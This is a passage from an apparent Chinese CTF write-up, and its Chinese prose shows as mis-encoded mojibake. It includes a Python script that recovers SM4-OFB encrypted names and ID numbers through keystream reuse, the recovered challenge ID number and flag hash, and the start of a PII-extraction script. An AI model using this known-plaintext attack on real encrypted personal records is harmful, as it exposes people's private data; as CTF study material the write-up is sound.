</span></span></span><span class="line"><span class="cl"><span class="s2">   but ideally you should supply a longer known plaintext/ciphertext pair to
</span></span></span><span class="line"><span class="cl"><span class="s2">   derive more keystream blocks.
</span></span></span><span class="line"><span class="cl"><span class="s2"> - Requires pycryptodome for padding utilities:
</span></span></span><span class="line"><span class="cl"><span class="s2">       pip install pycryptodome
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Edit the KNOWN_* constants below if your known record1 values differ.
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span><span class="p">,</span> <span class="n">hexlify</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span><span class="p">,</span> <span class="n">unpad</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ----- KNOWN VALUES ----</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># These are taken from the CTF prompt / earlier messages. Change them if needed.</span>
</span></span><span class="line"><span class="cl"><span class="n">KNOWN_NAME_PLAIN</span> <span class="o">=</span> <span class="s2">&#34;è’‹å®ç²&#34;</span>  <span class="c1"># record1 known plaintext for name field</span>
</span></span><span class="line"><span class="cl"><span class="n">KNOWN_NAME_CIPHER_HEX</span> <span class="o">=</span> <span class="s2">&#34;cef18c919f99f9ea19905245fae9574e&#34;</span>  <span class="c1"># record1 name ciphertext hex</span>
</span></span><span class="line"><span class="cl"><span class="n">IV_HEX</span> <span class="o">=</span> <span class="s2">&#34;6162636465666768696a6b6c6d6e6f70&#34;</span>  <span class="c1"># the IV column (fixed)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Block size for SM4 (16 bytes)</span>
</span></span><span class="line"><span class="cl"><span class="n">BS</span> <span class="o">=</span> <span class="mi">16</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ----- Helpers ---------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">xor_bytes</span><span class="p">(</span><span class="n">a</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">x</span> <span class="o">^</span> <span class="n">y</span> <span class="k">for</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">split_blocks</span><span class="p">(</span><span class="n">b</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">bs</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">BS</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="n">bs</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">),</span> <span class="n">bs</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ----- Derive keystream from the known pair</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">derive_keystream_from_known</span><span class="p">(</span><span class="n">known_plain</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">known_cipher_hex</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">known_plain</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">known_cipher_hex</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p_padded</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">BS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">p_blocks</span> <span class="o">=</span> <span class="n">split_blocks</span><span class="p">(</span><span class="n">p_padded</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c_blocks</span> <span class="o">=</span> <span class="n">split_blocks</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">p_blocks</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">len</span><span class="p">(</span><span class="n">c_blocks</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s1">&#39;Known plaintext/cipher block count mismatch&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ks_blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">xor_bytes</span><span class="p">(</span><span class="n">cb</span><span class="p">,</span> <span class="n">pb</span><span class="p">)</span> <span class="k">for</span> <span class="n">cb</span><span class="p">,</span> <span class="n">pb</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">c_blocks</span><span class="p">,</span> <span class="n">p_blocks</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ks_blocks</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ----- Recovery --------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_name_from_cipher_hex</span><span class="p">(</span><span class="n">cipher_hex</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">ks_blocks</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">cipher_hex</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="n">c_blocks</span> <span class="o">=</span> <span class="n">split_blocks</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># If there are more cipher blocks than ks_blocks, warn and reuse ks cyclically</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">c_blocks</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">ks_blocks</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[WARN] cipher needs </span><span class="si">%d</span><span class="s2"> blocks but only </span><span class="si">%d</span><span class="s2"> keystream blocks available; reusing keystream cyclically&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">c_blocks</span><span class="p">),</span> <span class="nb">len</span><span class="p">(</span><span class="n">ks_blocks</span><span class="p">)),</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recovered_blocks</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">cb</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">c_blocks</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ks</span> <span class="o">=</span> <span class="n">ks_blocks</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">ks_blocks</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">        <span class="n">recovered_blocks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">xor_bytes</span><span class="p">(</span><span class="n">cb</span><span class="p">,</span> <span class="n">ks</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">recovered_padded</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">recovered_blocks</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Try to unpad and decode; if fails, return hex of raw bytes</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">recovered</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">recovered_padded</span><span class="p">,</span> <span class="n">BS</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">recovered</span> <span class="o">=</span> <span class="n">recovered_padded</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">recovered</span> <span class="o">=</span> <span class="s1">&#39;&lt;raw:&#39;</span> <span class="o">+</span> <span class="n">recovered_padded</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span> <span class="o">+</span> <span class="s1">&#39;&gt;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recovered</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ----- Main -----------</span>
</span></span><span class="line"><span class="cl"><span class="c1"># -----------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Usage: python3 sm4_ofb_batch_decrypt_names.py &lt;names_cipher_file&gt;&#39;</span><span class="p">,</span> <span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">inpath</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ks_blocks</span> <span class="o">=</span> <span class="n">derive_keystream_from_known</span><span class="p">(</span><span class="n">KNOWN_NAME_PLAIN</span><span class="p">,</span> <span class="n">KNOWN_NAME_CIPHER_HEX</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">inpath</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">lineno</span><span class="p">,</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">line</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># Assume each line is one hex-encoded name ciphertext (no spaces)</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">recovered</span> <span class="o">=</span> <span class="n">recover_name_from_cipher_hex</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">ks_blocks</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">recovered</span> <span class="o">=</span> <span class="s1">&#39;&lt;error: </span><span class="si">%s</span><span class="s1">&gt;&#39;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">recovered</span><span class="si">}</span><span class="se">\t</span><span class="si">{</span><span class="n">line</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœç´¢ï¼Œå‘ç°ä¸<code>ä½•æµ©ç’</code>å¯¹åº”çš„å¯†æ–‡æ˜¯<code>c2de929284bff9f63b905245fae9574e</code>ï¼Œå†å»Excelé‡Œæœè¿™ä¸²å¯†æ–‡å¯¹åº”çš„èº«ä»½è¯å·çš„å¯†æ–‡ï¼Œå¾—åˆ°ï¼š<code>1751374401262f5d9ca36576ccde617fad8baace87de269e6659fdbc1f3ea41c</code>ï¼Œå†ç”¨ä¸Šé¢é‚£ä¸ªè„šæœ¬è§£å‡ºæ¥ï¼š<code>120000197404101676</code>ï¼Œè®¡ç®—md5ï¼š<code>fbb80148b75e98b18d65be446f505fcc</code>å³ä¸ºFlagã€‚</p>
<h3 id="dataidsort">dataIdSort
</h3><p>å°†éœ€æ±‚ä¸¢ç»™AIï¼Œè®©AIå†™äº†ä¸ªè„šæœ¬ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="c1"># coding: utf-8</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;
</span></span></span><span class="line"><span class="cl"><span class="s2">åŠŸèƒ½ï¼š
</span></span></span><span class="line"><span class="cl"><span class="s2">- ä» data.txt ä¸­æŒ‰é¡ºåºç²¾ç¡®æå–ï¼šèº«ä»½è¯(idcard)ã€æ‰‹æœºå·(phone)ã€é“¶è¡Œå¡(bankcard)ã€IPv4(ip)ã€MAC(mac)ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">- ä¸¥æ ¼éµå¾ªã€Šä¸ªäººä¿¡æ¯æ•°æ®è§„èŒƒæ–‡æ¡£ã€‹ï¼Œä¼˜åŒ–æ­£åˆ™è¡¨è¾¾å¼å’ŒåŒ¹é…ç­–ç•¥ä»¥è¾¾åˆ°é«˜å‡†ç¡®ç‡ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">- æ‰€æœ‰åŒ¹é…é¡¹å‡ä¿ç•™åŸå§‹æ ¼å¼ï¼Œå¹¶è¾“å‡ºåˆ° output.csv æ–‡ä»¶ä¸­ã€‚
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">csv</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ------------------- é…ç½® -------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">INPUT_FILE</span> <span class="o">=</span> <span class="s2">&#34;data.txt&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">OUTPUT_FILE</span> <span class="o">=</span> <span class="s2">&#34;output.csv&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>  <span class="c1"># è®¾ç½®ä¸º True ä»¥åœ¨æ§åˆ¶å°æ‰“å°è¯¦ç»†çš„æ¥å—/æ‹’ç»æ—¥å¿—</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># æ‰‹æœºå·å‰ç¼€ç™½åå•</span>
</span></span><span class="line"><span class="cl"><span class="n">ALLOWED_MOBILE_PREFIXES</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;134&#34;</span><span class="p">,</span> <span class="s2">&#34;135&#34;</span><span class="p">,</span> <span class="s2">&#34;136&#34;</span><span class="p">,</span> <span class="s2">&#34;137&#34;</span><span class="p">,</span> <span class="s2">&#34;138&#34;</span><span class="p">,</span> <span class="s2">&#34;139&#34;</span><span class="p">,</span> <span class="s2">&#34;147&#34;</span><span class="p">,</span> <span class="s2">&#34;148&#34;</span><span class="p">,</span> <span class="s2">&#34;150&#34;</span><span class="p">,</span> <span class="s2">&#34;151&#34;</span><span class="p">,</span> <span class="s2">&#34;152&#34;</span><span class="p">,</span> <span class="s2">&#34;157&#34;</span><span class="p">,</span> <span class="s2">&#34;158&#34;</span><span class="p">,</span> <span class="s2">&#34;159&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;172&#34;</span><span class="p">,</span> <span class="s2">&#34;178&#34;</span><span class="p">,</span> <span class="s2">&#34;182&#34;</span><span class="p">,</span> <span class="s2">&#34;183&#34;</span><span class="p">,</span> <span class="s2">&#34;184&#34;</span><span class="p">,</span> <span class="s2">&#34;187&#34;</span><span class="p">,</span> <span class="s2">&#34;188&#34;</span><span class="p">,</span> <span class="s2">&#34;195&#34;</span><span class="p">,</span> <span class="s2">&#34;198&#34;</span><span class="p">,</span> <span class="s2">&#34;130&#34;</span><span class="p">,</span> <span class="s2">&#34;131&#34;</span><span class="p">,</span> <span class="s2">&#34;132&#34;</span><span class="p">,</span> <span class="s2">&#34;140&#34;</span><span class="p">,</span> <span class="s2">&#34;145&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;146&#34;</span><span class="p">,</span> <span class="s2">&#34;155&#34;</span><span class="p">,</span> <span class="s2">&#34;156&#34;</span><span class="p">,</span> <span class="s2">&#34;166&#34;</span><span class="p">,</span> <span class="s2">&#34;167&#34;</span><span class="p">,</span> <span class="s2">&#34;171&#34;</span><span class="p">,</span> <span class="s2">&#34;175&#34;</span><span class="p">,</span> <span class="s2">&#34;176&#34;</span><span class="p">,</span> <span class="s2">&#34;185&#34;</span><span class="p">,</span> <span class="s2">&#34;186&#34;</span><span class="p">,</span> <span class="s2">&#34;196&#34;</span><span class="p">,</span> <span class="s2">&#34;133&#34;</span><span class="p">,</span> <span class="s2">&#34;149&#34;</span><span class="p">,</span> <span class="s2">&#34;153&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;173&#34;</span><span class="p">,</span> <span class="s2">&#34;174&#34;</span><span class="p">,</span> <span class="s2">&#34;177&#34;</span><span class="p">,</span> <span class="s2">&#34;180&#34;</span><span class="p">,</span> <span class="s2">&#34;181&#34;</span><span class="p">,</span> <span class="s2">&#34;189&#34;</span><span class="p">,</span> <span class="s2">&#34;190&#34;</span><span class="p">,</span> <span class="s2">&#34;191&#34;</span><span class="p">,</span> <span class="s2">&#34;193&#34;</span><span class="p">,</span> <span class="s2">&#34;199&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ---------------------------------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ------------------- æ ¡éªŒå‡½æ•° -------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">luhn_check</span><span class="p">(</span><span class="n">digits</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;å¯¹æ•°å­—å­—ç¬¦ä¸²æ‰§è¡ŒLuhnç®—æ³•æ ¡éªŒã€‚&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">alt</span> <span class="o">=</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">digits</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">d</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">alt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">d</span> <span class="o">*=</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">d</span> <span class="o">&gt;</span> <span class="mi">9</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">d</span> <span class="o">-=</span> <span class="mi">9</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">+=</span> <span class="n">d</span>
</span></span><span class="line"><span class="cl">        <span class="n">alt</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">alt</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">s</span> <span class="o">%</span> <span class="mi">10</span> <span class="o">==</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">is_valid_id</span><span class="p">(</span><span class="n">raw</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;æ ¡éªŒèº«ä»½è¯å·çš„æœ‰æ•ˆæ€§ï¼ˆé•¿åº¦ã€æ ¼å¼ã€å‡ºç”Ÿæ—¥æœŸã€æ ¡éªŒç ï¼‰ã€‚&#34;&#34;&#34;</span>
